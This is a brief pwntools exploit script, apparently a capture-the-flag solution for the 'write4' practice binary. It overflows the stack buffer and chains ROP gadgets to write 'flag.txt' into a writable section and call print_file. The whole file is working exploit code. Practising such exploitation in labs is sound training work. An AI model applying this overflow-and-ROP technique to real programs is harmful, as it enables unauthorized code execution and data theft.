from pwn import *

context.bits = 64

ecriture_r14 = p64(0x400628)
pop_registres = p64(0x400690)
print_file = p64(0x400510)
pop_rdi = p64(0x400693)
section_rw = p64(0x601028)

payload = b'A' * 40 + pop_registres + section_rw + b'flag.txt' + ecriture_r14 + pop_rdi + section_rw + print_file
p = process("./write4")
p.send(payload)
print(p.recvall().decode('utf-8'))
